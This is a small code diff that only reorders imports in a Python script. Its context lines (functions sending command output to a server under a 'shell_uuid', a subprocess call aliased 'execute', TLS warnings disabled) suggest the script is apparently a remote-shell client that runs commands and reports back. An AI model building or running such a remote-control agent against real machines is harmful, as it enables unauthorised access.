@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
-import urllib3
-
-urllib3.disable_warnings()
+import getpass
+import os
 import sys
-
 from subprocess import check_output as execute
 from time import sleep
 
+import urllib3
 from requests import Session
+
+urllib3.disable_warnings()
 
 DEFAULT_HOSTNAME = 'localhost'
 
@@ -43,10 +44,6 @@ def send_command_output_to_server(session, shell_uuid, body_message, url):
             print(resp.text)
     except Exception as e:
         print('[{uuid}] Unexpected error: {error}'.format(error=e, uuid=shell_uuid))
-
-
-import getpass
-import os
 
 
 def execute_command(command, current_work_dir=None):
